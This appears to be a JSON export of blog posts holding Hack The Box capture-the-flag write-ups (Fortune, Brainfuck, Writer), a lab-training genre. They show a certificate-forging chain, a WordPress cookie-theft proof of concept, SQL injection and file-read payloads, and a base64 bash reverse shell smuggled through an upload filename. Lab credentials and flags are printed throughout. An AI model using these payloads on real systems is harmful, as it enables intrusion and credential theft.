serial.old\n│   └── dba\n│       └── authpf.sql\nFör enkelhet skapa en dir som heter custom-certs utanför dir bob. Skapa custom cert-key samt request för bob och charlie (subj-info tagen från bob/ca/index.txt samt bob/ca/intermediate/index.txt) i nyskapade custom-cert dir’en:\nopenssl req -newkey rsa:4096 -keyout bob_key.pem -out bob_csr.pem -nodes -days 365 -subj \"/C=CA/ST=ON/O=Fortune Co HTB/CN=Fortune Intermediate CA/emailAddress=bob@fortune.htb\"\n\nopenssl req -newkey rsa:4096 -keyout charlie_key.pem -out charlie_csr.pem -nodes -days 365 -subj \"/C=CA/ST=ON/O=Fortune Co HTB/CN=fortune.htb/emailAddress=charlie@fortune.htb\"\nDöp om filerna för enkelhetensskull:\nmv bob_key.pem bob.key && mv bob_csr.pem bob.csr\nmv charlie_key.pem charlie.key && mv charlie_csr.pem charlie.csr\n$ ls -al\ntotal 24\ndrwxr-xr-x 1 root root  108 Jun 26 14:25 .\ndrwxr-xr-x 1 root root  196 Jun 26 14:10 ..\n-rw-r--r-- 1 root root 1716 Jun 26 14:11 bob.csr\n-rw------- 1 root root 3272 Jun 26 14:11 bob.key\n-rw-r--r-- 1 root root 1704 Jun 26 14:12 charlie.csr\n-rw------- 1 root root 3272 Jun 26 14:12 charlie.key\nSignera certificate requests med intermediate.key (pwd = htb/machines/fortune/custom-certs):\nopenssl x509 -req -days 365 -in bob.csr -CA ../bob/ca/intermediate/certs/intermediate.cert.pem -CAkey ../bob/ca/intermediate/private/intermediate.key.pem -CAcreateserial -out bob.crt\n\nopenssl x509 -req -days 365 -in charlie.csr -CA ../bob/ca/intermediate/certs/intermediate.cert.pem -CAkey ../bob/ca/intermediate/private/intermediate.key.pem -CAcreateserial -out charlie.crt\nKonvertera .crt till .p12 för att kunna använda dem i Firefox, lämna password blankt (pwd = htb/machines/fortune/custom-certs):\nopenssl pkcs12 -export -out bob.p12 -inkey bob.key -in bob.crt -certfile ../bob/ca/intermediate/certs/intermediate.cert.pem\nopenssl pkcs12 -export -out charlie.p12 -inkey charlie.key -in charlie.crt -certfile ../bob/ca/intermediate/certs/intermediate.cert.pem\nImportera charlie.p12 i Firefox och surfa in på https://10.10.10.127 för att få SSH key pair\noptions -&gt; preferences -&gt; advanced -&gt; certificates -&gt; view certificates -&gt; your certificates -&gt; import -&gt; select charlie.p12 -&gt; ok\nTryck på “generate” och spara ner public key i /root/.ssh/id_rsa.pub (perm 644) samt private i /root/.ssh/id_rsa (perm 600)\nLogga in som nfsuser med public key. ssh nfsuser@10.10.10.127"
  },
  {
    "objectID": "posts/2021-02-16-htb-writeup-brainfuck/2021-02-16-htb-writeup-brainfuck.html",
    "href": "posts/2021-02-16-htb-writeup-brainfuck/2021-02-16-htb-writeup-brainfuck.html",
    "title": "Brainfuck - Hack The Box",
    "section": "",
    "text": "“Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry’s standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum.”\n\n██╗ ██╗███████╗███████╗██████╗ ██║ ██║██╔════╝██╔════╝██╔══██╗ ██║ ██║███████╗█████╗ ██████╔╝ ██║ ██║╚════██║██╔══╝ ██╔══██╗ ╚██████╔╝███████║███████╗██║ ██║ ╚═════╝ ╚══════╝╚══════╝╚═╝ ╚═╝\n\n[root:/git/htb/brainfuck]# nmap -Pn -n -sCV 10.10.10.17 (master✱) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 94:d0:b3:34:e9:a5:37:c5:ac:b9:80:df:2a:54:a5:f0 (RSA) | 256 6b:d5:dc:15:3a:66:7a:f4:19:91:5d:73:85:b2:4c:b2 (ECDSA) |_ 256 23:f5:a3:33:33:9d:76:d5:f2:ea:69:71:e3:4e:8e:02 (ED25519) 25/tcp open smtp Postfix smtpd |_smtp-commands: brainfuck, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, 110/tcp open pop3 Dovecot pop3d |_pop3-capabilities: USER RESP-CODES SASL(PLAIN) AUTH-RESP-CODE CAPA TOP PIPELINING UIDL 143/tcp open imap Dovecot imapd |_imap-capabilities: capabilities ENABLE IDLE have AUTH=PLAINA0001 more Pre-login LOGIN-REFERRALS post-login IMAP4rev1 OK SASL-IR listed LITERAL+ ID 443/tcp open ssl/http nginx 1.10.0 (Ubuntu) |_http-server-header: nginx/1.10.0 (Ubuntu) |_http-title: Welcome to nginx! | ssl-cert: Subject: commonName=brainfuck.htb/organizationName=Brainfuck Ltd./stateOrProvinceName=Attica/countryName=GR | Subject Alternative Name: DNS:www.brainfuck.htb, DNS:sup3rs3cr3t.brainfuck.htb | Not valid before: 2017-04-13T11:19:29 |Not valid after: 2027-04-11T11:19:29 |ssl-date: TLS randomness does not represent time | tls-alpn: | http/1.1 | tls-nextprotoneg: | http/1.1 Service Info: Host: brainfuck; OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nDIRB: -\nNIKTO: -\n\nAdd the the names ‘www.brainfuck.htb’ and ‘sup3rs3cr3t.brainfuck.htb’ to /etc/hosts, found from the nmap output.\n‘sup3rs3cr3t.brainfuck.htb’ is a git-like page. Looking around we find the users ‘orestis’ and ‘admin’. We can create an account but not much more then that.\n‘www.brainfuck.htb’ is the main wordpress page. Visiting ‘https://brainfuck.htb/wp-login.php’ we find in the source code that it’s version 4.7.3.\nRun WPscan towards the site to see if we find any vulnerable plugins.\n[root:/git/htb/brainfuck]# wpscan –url https://brainfuck.htb/ –enumerate p –disable-tls-checks [+] wp-support-plus-responsive-ticket-system | Location: https://brainfuck.htb/wp-content/plugins/wp-support-plus-responsive-ticket-system/ | Last Updated: 2019-09-03T07:57:00.000Z | [!] The version is out of date, the latest version is 9.1.2 | | Found By: Urls In Homepage (Passive Detection) | | Version: 7.1.3 (100% confidence) | Found By: Readme - Stable Tag (Aggressive Detection) | - https://brainfuck.htb/wp-content/plugins/wp-support-plus-responsive-ticket-system/readme.txt | Confirmed By: Readme - ChangeLog Section (Aggressive Detection) | - https://brainfuck.htb/wp-content/plugins/wp-support-plus-responsive-ticket-system/readme.txt\nReading about wp-support-plus-responsive-ticket-system 7.1.3 we find a vulnerability where we can steal admin cookies to gain unauth access.\nDownload the POC-code and modify it to our needs. [root:/git/htb/brainfuck]# cat test.html (master✱)\n\n\n\nPlayerThree POC - wp_set_auth_cookie PrivEsc\n\n\n\nEnter username of whom to steal cookie from. Press ‘STEAL!’.\n\n\n\nVisit https://brainfuck.htb/wp-admin/ to gain the users admin access.\n\n\nUsername:    \n\n\n\n\n\nOpen the file, press ‘STEAL!’ and then visit https://brainfuck.htb/wp-admin/ to reach the admin dashboard.\nIn the wp-admin dashboard browse to Settings &gt; Easy WP SMTP. Inspect element and you’ll see the hidden password.\n\nSMTP Creds: orestis:kHGuERB29DNiNE\nAs we could see from initial recon pop3 (110) and imap (143) are open on the remote host. Either setup a mail-client, like Thunderbird, or access the server through telnet. I chose to start with telnet as it’s faster, if we don’t find anything of use I’d go to Thunderbird.\nroot@nidus:/git/htb/brainfuck# telnet 10.10.10.17 110 Trying 10.10.10.17… Connected to 10.10.10.17. Escape character is ‘^]’. +OK Dovecot ready. USER orestis +OK PASS kHGuERB29DNiNE +OK Logged in.\nRETR 2 +OK 514 octets Return-Path: root@brainfuck.htb X-Original-To: orestis Delivered-To: orestis@brainfuck.htb Received: by brainfuck (Postfix, from userid 0) id 4227420AEB; Sat, 29 Apr 2017 13:12:06 +0300 (EEST) To: orestis@brainfuck.htb Subject: Forum Access Details Message-Id: 20170429101206.4227420AEB@brainfuck Date: Sat, 29 Apr 2017 13:12:06 +0300 (EEST) From: root@brainfuck.htb (root)\nHi there, your credentials for our “secret” forum are below :)\nusername: orestis password: kIEnnfEKJ#9UmdO\nRegards .\nWe found an email with credentials orestis:kIEnnfEKJ#9UmdO to the “secret” forum. Browse to sup3rs3cr3t.brainfuck.htb and login as orestis.\nHere we find a message from the admin saying that all SSH passwords are revoked, and the users should use keys instead. orestis and admin have an enctrypted conversation, we instantly spot a url and try to decode the message.\nmnvze://10.10.10.17/8zb5ra10m915218697q1h658wfoq0zc8/frmfycu/sp_ptr\n‘mnvze’ is most likely https, and ‘sp_ptr’ could be id_rsa since they are talking about ssh keys.\nLooking at unencrypted posts in thread SSH Access orestis always ends his posts with ‘Orestis - Hacking for fun and profit’, this gives us a huge hint as all encrypted messages have a similar ending.\nPieagnm - Jkoijeg nbw zwx mle grwsnn Wejmvse - Fbtkqal zqb rso rnl cwihsf Qbqquzs - Pnhekxs dpi fca fhf zdmgzt\nTesting around different common ciphers I found that Vigenere Cipher gave me an interesting output. Passphrase: https Message: mnvze Decoded message: fuckm\nTesting if sp_ptr is id_rsa. Passphrase: id_rsa Message: sp_ptr Decoded message: km_ybr\nLets try the signatures as well: Passphrase: orestis Message1: Pieagnm Decode1: Brainfu\nMessage2: Wejmvse Decode2: Infuckm\nMessage3: Qbqquzs Decode3: Ckmybra\nAdding all the decoded messages together it looks like the key should be ‘fuckmybrain’\nDecrypting the conversation between Orestis and Admin:\nADMIN: There you go you stupid fuck, I hope you remember your key password because I dont :) https://10.10.10.17/8ba5aa10e915218697d1c658cdee0bb8/orestis/id_rsa\nORESTIS: No problem, I’ll brute force it ;)\nDownload the id_rsa and brute force it.\nConvert id_rsa (.pem) to hash with ssh2john, and the crack with john. [root:/git/htb/brainfuck]# /usr/share/john/ssh2john.py id_rsa &gt; id_rsa.hash [root:/git/htb/brainfuck]# john id_rsa.hash -wordlist=/usr/share/wordlists/rockyou.txt [..] 3poulakia! (id_rsa)\n[root:/git/htb/brainfuck]# chmod 600 id_rsa [root:/git/htb/brainfuck]# ssh orestis@10.10.10.17 -i id_rsa (master✱) Enter passphrase for key ‘id_rsa’:3poulakia! [..] orestis@brainfuck:~$ cat user.txt 2c11cfbc5b959f73ac15a3310bd097c9\n\n██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████\n██████╗ ██████╗ ██████╗ ████████╗ ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝ ██████╔╝██║ ██║██║ ██║ ██║ ██╔══██╗██║ ██║██║ ██║ ██║ ██║ ██║╚██████╔╝╚██████╔╝ ██║ ╚═╝ ╚═╝ ╚═════╝ ╚═════╝ ╚═╝\n\nIn orestis home directory we find three files pointing us towards root.txt.\n\nencrypt.sage\noutput.txt\ndebug.txt\n\n\nENCRYPT BREAKDOWN; PASSWORD: - sets content of /root/root.txt as variable ‘password’ - encodes ‘password’ to hex16, and declare it variable ‘m’, as an integer - c = pow(m, e, n), meaning (m**e) % n = c - Encrypted password = c\nTo get the unencrypted password I need to figure out the variables m, e and n to be able to reverse it.\n\ne = last string of debug.txt\nn = first (p) * second (q) string of debug.txt\nm = calculate the equation (m**e) % n = output.txt\n\nThe code to grab /root/root.txt is commented making it possible to understand what happens. [root:/git/htb/brainfuck]# python3 root-plz.py (master✱) Formel to calculate: (x^b) mod c = y —snip— x decoded (/root/root.txt): 6efc1a5dbb8904751ce6566a305bb8ef\n\nReport flag and win.\n██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████\n██╗███╗ ██╗███████╗ ██████╗ ██████╗ ███╗ ███╗ █████╗ ████████╗██╗ ██████╗ ███╗ ██╗ ██║████╗ ██║██╔════╝██╔═══██╗██╔══██╗████╗ ████║██╔══██╗╚══██╔══╝██║██╔═══██╗████╗ ██║ ██║██╔██╗ ██║█████╗ ██║ ██║██████╔╝██╔████╔██║███████║ ██║ ██║██║ ██║██╔██╗ ██║ ██║██║╚██╗██║██╔══╝ ██║ ██║██╔══██╗██║╚██╔╝██║██╔══██║ ██║ ██║██║ ██║██║╚██╗██║ ██║██║ ╚████║██║ ╚██████╔╝██║ ██║██║ ╚═╝ ██║██║ ██║ ██║ ██║╚██████╔╝██║ ╚████║ ╚═╝╚═╝ ╚═══╝╚═╝ ╚═════╝ ╚═╝ ╚═╝╚═╝ ╚═╝╚═╝ ╚═╝ ╚═╝ ╚═╝ ╚═════╝ ╚═╝ ╚═══╝\nWordPress Plugin WP Support Plus Responsive Ticket System 7.1.3 - Privilege Escalation POC https://www.exploit-db.com/exploits/41006\nPOP3 Using Telnet: https://kewl.lu/articles/pop3/\nVigenere Cipher decrypt: http://rumkin.com/tools/cipher/vigenere.php\nCharmichael lambda: https://stackoverflow.com/questions/49818392/how-to-find-reverse-of-powa-b-c-in-python\nDecode integer: https://stackoverflow.com/questions/40123901/python-integer-to-hex-string-with-padding/40123984#40123984"
  },
  {
    "objectID": "posts/2021-09-14-htb-writeup-writer/2021-09-14-htb-writeup-writer.html",
    "href": "posts/2021-09-14-htb-writeup-writer/2021-09-14-htb-writeup-writer.html",
    "title": "Writer - Hack The Box",
    "section": "",
    "text": "USER\n\nStep 1\nStandard enum with nmap, dirb, nikto, ffuf, smbclient and rpcclient.\nnmap:\n$ nmap -Pn -n -sCV 10.10.11.101\n  PORT    STATE SERVICE     VERSION\n  22/tcp  open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)\n  | ssh-hostkey:\n  |   3072 98:20:b9:d0:52:1f:4e:10:3a:4a:93:7e:50:bc:b8:7d (RSA)\n  |   256 10:04:79:7a:29:74:db:28:f9:ff:af:68:df:f1:3f:34 (ECDSA)\n  |_  256 77:c4:86:9a:9f:33:4f:da:71:20:2c:e1:51:10:7e:8d (ED25519)\n  80/tcp  open  http        Apache httpd 2.4.41 ((Ubuntu))\n  |_http-server-header: Apache/2.4.41 (Ubuntu)\n  |_http-title: Story Bank | Writer.HTB\n  139/tcp open  netbios-ssn Samba smbd 4.6.2\n  445/tcp open  netbios-ssn Samba smbd 4.6.2\n  Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\n  Host script results:\n  |_clock-skew: 1m50s\n  |_nbstat: NetBIOS name: WRITER, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)\n  | smb2-security-mode:\n  |   2.02:\n  |_    Message signing enabled but not required\n  | smb2-time:\n  |   date: 2021-09-09T11:21:07\n  |_  start_date: N/A\nDIRB:\n+ http://10.10.11.101/about (CODE:200|SIZE:3522)\n+ http://10.10.11.101/contact (CODE:200|SIZE:4905)\n+ http://10.10.11.101/dashboard (CODE:302|SIZE:208)\n+ http://10.10.11.101/logout (CODE:302|SIZE:208)\n+ http://10.10.11.101/server-status (CODE:403|SIZE:277)\n==&gt; DIRECTORY: http://10.10.11.101/static/\nFFUF:\n+ administrative          [Status: 200, Size: 1443, Words: 185, Lines: 35]\nNIKTO:\n+ Server: Apache/2.4.41 (Ubuntu)\nSMBCLIENT:\n$ smbclient -L 10.10.11.101\nEnter WORKGROUP\\voids password:\n\n    Sharename       Type      Comment\n    ---------       ----      -------\n    print$          Disk      Printer Drivers\n    writer2_project Disk\n    IPC$            IPC       IPC Service (writer server (Samba, Ubuntu))\nRPCCLIENT:\n$ rpcclient -U \"\" -N 10.10.11.101                                                                            130 ⨯\nrpcclient $&gt; enumdomusers\n  user:[kyle] rid:[0x3e8]\nrpcclient $&gt; enumdomains\n  name:[WRITER] idx:[0x0]\nrpcclient $&gt; queryuser kyle\n    User Name   :   kyle\n    Full Name   :   Kyle Travis\n    Home Drive  :   \\\\writer\\kyle\n    Dir Drive   :\n    Profile Path:   \\\\writer\\kyle\\profile\n    Logon Script:\n    Description :\n    Workstations:\n    Comment     :\n    Remote Dial :\n    Logon Time               :  Thu, 01 Jan 1970 01:00:00 CET\n    Logoff Time              :  Wed, 06 Feb 2036 16:06:39 CET\n    Kickoff Time             :  Wed, 06 Feb 2036 16:06:39 CET\n    Password last set Time   :  Tue, 18 May 2021 19:03:35 CEST\n    Password can change Time :  Tue, 18 May 2021 19:03:35 CEST\n    Password must change Time:  Thu, 14 Sep 30828 04:48:05 CEST\n    unknown_2[0..31]...\n    user_rid :  0x3e8\n    group_rid:  0x201\n    acb_info :  0x00000010\n    fields_present: 0x00ffffff\n    logon_divs: 168\n    bad_password_count: 0x00000000\n    logon_count:    0x00000000\n    padding1[0..7]...\n    logon_hrs[0..21]...\n\n\n\nStep 2\nThe login formula at http://writer.htb/administrative is vulnerable to SQL injection and can be bypassed by entering “admin’– -” as user, with any password. The admin dashboard have an interesting upload function but after playing around with it for a few hours I decide to move on and go back to the vulnerable login function.\nPlay around with Burp repeater with the goal to extract sensitive database information.\nREQUEST 1:\nPOST /administrative HTTP/1.1\n Host: 10.10.11.101\n ..\n uname=admin%27 union all select 1,@@version,3,4,5,6;-&password=123\nRESPONSE 1:\n10.3.29-MariaDB-0ubuntu0.20.04.1\n\n\nPOLLING DB WRITER:\nREQUEST 2:\nuname=admin%27 union all select 1,concat(0x2c,table_name),3,4,5,6 FROM information_schema.TABLES WHERE table_schema='writer';-&password=123\nRESPONSE 2:\nsite,stories,users\nREQUEST 3:\nuname=admin%27 union all select 1,concat(username,0x3a,password),3,4,5,6 from users;-&password=123\nRESPONSE 3:\nadmin:118e48794631a9612484ca8b55f622d0\n\n\nPOLLING DB INFORMATION_SCHEMA:\nREQUEST 4:\nuname=admin%27 union all select 1,concat(table_name,0x2c),3,4,5,6 from information_schema.tables;-&password=123\nRESPONSE 4:\nALL_PLUGINS,APPLICABLE_ROLES,CHARACTER_SETS,CHECK_CONSTRAINTS,COLLATIONS,COLLATION_CHARACTER_SET_APPLICABILITY,COLUMNS,COLUMN_PRIVILEGES,ENABLED_ROLES,ENGINES,EVENTS,FILES,GLOBAL_STATUS,GLOBAL_VARIABLES,KEY_CACHES,KEY_COLUMN_USAGE,PARAMETERS,PARTITIONS,PLUGINS,PROCESSLIST,PROFILING,REFERENTIAL_CONSTRAINTS,ROUTINES,SCHEMATA,SCHEMA_PRIVILEGES,SESSION_STATUS,SESSION_VARIABLES,STATISTICS,SYSTEM_VARIABLES,TABLES,TABLESPACES,TABLE_CONSTRAINTS,TABLE_PRIVILEGES,TRIGGERS,USER_PRIVILEGES,VIEWS,GEOMETRY_COLUMNS,SPATIAL_REF_SYS,CLIENT_STATISTICS,INDEX_STATISTICS,INNODB_SYS_DATAFILES,USER_STATISTICS,INNODB_SYS_TABLESTATS,INNODB_LOCKS,INNODB_MUTEXES,INNODB_CMPMEM,INNODB_CMP_PER_INDEX,INNODB_CMP,INNODB_FT_DELETED,INNODB_CMP_RESET,INNODB_LOCK_WAITS,TABLE_STATISTICS,INNODB_TABLESPACES_ENCRYPTION,INNODB_BUFFER_PAGE_LRU,INNODB_SYS_FIELDS,INNODB_CMPMEM_RESET,INNODB_SYS_COLUMNS,INNODB_FT_INDEX_TABLE,INNODB_CMP_PER_INDEX_RESET,user_variables,INNODB_FT_INDEX_CACHE,INNODB_SYS_FOREIGN_COLS,INNODB_FT_BEING_DELETED,INNODB_BUFFER_POOL_STATS,INNODB_TRX,INNODB_SYS_FOREIGN,INNODB_SYS_TABLES,INNODB_FT_DEFAULT_STOPWORD,INNODB_FT_CONFIG,INNODB_BUFFER_PAGE,INNODB_SYS_TABLESPACES,INNODB_METRICS,INNODB_SYS_INDEXES,INNODB_SYS_VIRTUAL,INNODB_TABLESPACES_SCRUBBING,INNODB_SYS_SEMAPHORE_WAITS,site,stories,users,\nAt the end we see table users, lets extract columns from it.\nREQUEST 5:\nuname=admin%27 union all select 1,concat(column_name,0x2c),3,4,5,6 from information_schema.columns where table_name='users';-&password=123\nRESPONSE 5:\nid,username,password,email,status,date_created,\nREQUEST 6:\nuname=admin%27 union all select 1,concat(username,0x3a,password),3,4,5,6 from information_schema.users;-&password=123\nRESPONSE 6:\nIncorrect creds.\nUnfortunately we are not able to get any credentials from the writer database, however we were able to get the information_schema admin credentials in request 3.\n\n\n\nStep 3\nWe can’t crack the admin-hash using hashcat and rockyou.txt, nor is the hash in crackstation.org. Playing around further with SQLi we are able to read files (LFI) using load_file.\nREQUEST 7:\nuname=admin%27 union all select 1,load_file('/etc/passwd'),3,4,5,6;--&password=123\nRESPONSE 7:\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\nsystemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin\nsystemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin\nsystemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin\nmessagebus:x:103:106::/nonexistent:/usr/sbin/nologin\nsyslog:x:104:110::/home/syslog:/usr/sbin/nologin\n_apt:x:105:65534::/nonexistent:/usr/sbin/nologin\ntss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false\nuuidd:x:107:112::/run/uuidd:/usr/sbin/nologin\ntcpdump:x:108:113::/nonexistent:/usr/sbin/nologin\nlandscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin\npollinate:x:110:1::/var/cache/pollinate:/bin/false\nusbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin\nsshd:x:112:65534::/run/sshd:/usr/sbin/nologin\nsystemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin\nkyle:x:1000:1000:Kyle Travis:/home/kyle:/bin/bash\nlxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false\npostfix:x:113:118::/var/spool/postfix:/usr/sbin/nologin\nfilter:x:997:997:Postfix Filters:/var/spool/filter:/bin/sh\njohn:x:1001:1001:,,,:/home/john:/bin/bash\nmysql:x:114:120:MySQL Server,,,:/nonexistent:/bin/false\nAt this point I’m pretty stumped and unsure what to look for, so to simplify things I sent the SQL Injection to Burp Intruder and fired it up using a LFI-list. From the output we found etc/apache2/sites-enabled/000-default.conf which gave us additional clues.\nREQUEST 8:\nuname=admin%27 union all select 1,load_file('%2fetc%2fapache2%2fsites-enabled%2f000-default%2econf'),3,4,5,6;--&password=123\nRESPONSE 8:\n# Virtual host configuration for writer.htb domain\n&lt;VirtualHost *:80&gt;\n        ServerName writer.htb\n        ServerAdmin admin@writer.htb\n        WSGIScriptAlias / /var/www/writer.htb/writer.wsgi\n        &lt;Directory /var/www/writer.htb&gt;\n                Order allow,deny\n                Allow from all\n        &lt;/Directory&gt;\n        Alias /static /var/www/writer.htb/writer/static\n        &lt;Directory /var/www/writer.htb/writer/static/&gt;\n                Order allow,deny\n                Allow from all\n        &lt;/Directory&gt;\n        ErrorLog ${APACHE_LOG_DIR}/error.log\n        LogLevel warn\n        CustomLog ${APACHE_LOG_DIR}/access.log combined\n&lt;/VirtualHost&gt;\n\n# Virtual host configuration for dev.writer.htb subdomain\n# Will enable configuration after completing backend development\n# Listen 8080\n#&lt;VirtualHost 127.0.0.1:8080&gt;\n#   ServerName dev.writer.htb\n#   ServerAdmin admin@writer.htb\n#\n# Collect static for the writer2_project/writer_web/templates\n#   Alias /static /var/www/writer2_project/static\n\nWe find the absolute path of the web server: /var/www/writer.htb\nA new interesting file: /var/www/writer.htb/writer.wsgi\nCan from the output we can assume that SMB and the dir writer2_project is a rabbit hole\n\nIf we look on the file /var/www/writer.htb/writer.wsgi it will point us towards a new file, /var/www/writer.htb/writer/__init__.py. Investigating the file we find that all uploaded images are moved using a vulnerable os.system function:\nos.system(\"mv {} {}.jpg\".format(local_filename, local_filename))\n\n\n\nStep 4\nExploit the file upload POST form image_url to get a reverse shell.\n\nBase64 encode a bash reverse shell\n\n$ echo -n '/bin/bash -c \"/bin/bash -i &gt;& /dev/tcp/10.10.14.2/4488 0&gt;&1\"' | base64\n  L2Jpbi9iYXNoIC1jICIvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMi80NDg4IDA+JjEi\n\nAdd the exploit code to a .jpg image\n\n$ touch 'skull.jpg; `echo L2Jpbi9iYXNoIC1jICIvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMi80NDg4IDA+JjEi|base64 -d | bash`;'\n\nUpload the exploited .jpg image and capture the POST in Burp\nSince we know the absolute path of the file, execute the malicious code under the image_url POST form:\n\nContent-Disposition: form-data; name=\"image_url\"\nfile:///var/www/writer.htb/writer/static/img/skull.jpg; `echo L2Jpbi9iYXNoIC1jICIvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMi80NDg4IDA+JjEi|base64 -d | bash`;\n\nCapture the incoming request\n\n$ nc -lvnp 4488\n    listening on [any] 4488 ...\n    connect to [10.10.14.2] from (UNKNOWN) [10.10.11.101] 56014\n    bash: cannot set terminal process group (1023): Inappropriate ioctl for device\n    bash: no job control in this shell\n    www-data@writer:/$\n\n\n\nStep 5\nAs www-data we are not able to grab user.txt yet. Use linpeas to find a way to pivot to user kyle or john.\nwww-data@writer:/dev/shm$ linpeas.sh\n    ..\n    Analyzing MariaDB Files (limit 70)\n    -rw-r--r-- 1 root root 972 May 19 12:34 /etc/mysql/mariadb.cnf\n    [client-server]\n    !includedir /etc/mysql/conf.d/\n    !includedir /etc/mysql/mariadb.conf.d/\n    [client]\n    database = dev\n    user = djangouser\n    password = DjangoSuperPassword\n    default-character-set = utf8\nwww-data@writer:/home/kyle$ mysql -u djangouser -p\n    MariaDB [dev]&gt; show databases;\n    +--------------------+\n    | Database           |\n    +--------------------+\n    | dev                |\n    | information_schema |\n    +--------------------+\n    2 rows in set (0.000 sec)\n\n    MariaDB [dev]&gt; show tables;\n    +----------------------------+\n    | Tables_in_dev              |\n    +----------------------------+\n    | auth_group                 |\n    | auth_group_permissions     |\n    | auth_permission            |\n    | auth_user                  |\n    | auth_user_groups           |\n    | auth_user_user_permissions |\n    | django_admin_log           |\n    | django_content_type        |\n    | django_migrations          |\n    | django_session             |\n    +----------------------------+\n    10 rows in set (0.000 sec)\n\n    MariaDB [dev]&gt; SELECT * from auth_user;\n    +----+------------------------------------------------------------------------------------------+------------+--------------+----------+------------+-----------+-----------------+----------+-----------+----------------------------+\n    | id | password                                                                                 | last_login | is_superuser | username | first_name | last_name | email           | is_staff | is_active | date_joined                |\n    +----+------------------------------------------------------------------------------------------+------------+--------------+----------+------------+-----------+-----------------+----------+-----------+----------------------------+\n    |  1 | pbkdf2_sha256$260000$wJO3ztk0fOlcbssnS1wJPD$bbTyCB8dYWMGYlz4dSArozTY7wcZCS7DV6l5dpuXM4A= | NULL       |            1 | kyle     |            |           | kyle@writer.htb |        1 |         1 | 2021-05-19 12:41:37.168368 |\n    +----+------------------------------------------------------------------------------------------+------------+--------------+----------+------------+-----------+-----------------+----------+-----------+----------------------------+\n    1 row in set (0.001 sec)\nLooking through hashcat example hashes it seems to be a Django (m10000) hash, which makes sense.\nvoid@void:~/Documents$ hashcat -a0 -m10000 hash.txt /usr/share/wordlists/rockyou.txt\n  ..\n  pbkdf2_sha256$260000$wJO3ztk0fOlcbssnS1wJPD$bbTyCB8dYWMGYlz4dSArozTY7wcZCS7DV6l5dpuXM4A=:marcoantonio\n\n  Session..........: hashcat\n  Status...........: Cracked\n  Hash.Type........: Django (PBKDF2-SHA256)\n  Hash.Target......: pbkdf2_sha256$260000$wJO3ztk0fOlcbssnS1wJPD$bbTyCB8...uXM4A=\n\n\n\nStep 6\n\nLogin with cracked creds (kyle:marcoantonio) and grab user.txt\n\n$ ssh kyle@writer.htb\nkyle@writer:~$ id && hostname\n  uid=1000(kyle) gid=1000(kyle) groups=1000(kyle),997(filter),1002(smbgroup)\n  writer\nkyle@writer:~$ cat user.txt\n  b20af09f4741426d488658c2d7319527\n\n\n\n\nROOT\n\nStep 1\nAs usual check sudo -l, which is not available for user kyle. Running linpeas we find a few interesting things:\nUsers with console:\nfilter:x:997:997:Postfix Filters:/var/spool/filter:/bin/sh\njohn:x:1001:1001:,,,:/home/john:/bin/bash\nkyle:x:1000:1000:Kyle Travis:/home/kyle:/bin/bash\n\nUser Groups:\nuid=1000(kyle) gid=1000(kyle) groups=1000(kyle),997(filter),1002(smbgroup)\nuid=1001(john) gid=1001(john) groups=1001(john),1003(management)\nuid=997(filter) gid=997(filter) groups=997(filter)\nUser kyle is in group filter, and filter is in control of postfix. Linpeas also shows us that /etc/postfix/master.cf is present and contains scripts to be executed, hinting that this should probably be used to pivot or get root access.\n-rw-r--r-- 1 root root 6373 Sep 10 13:18 /etc/postfix/master.cf\n  flags=DRhu user=vmail argv=/usr/bin/maildrop -d ${recipient}\n#  user=cyrus argv=/cyrus/bin/deliver -e -r ${sender} -m 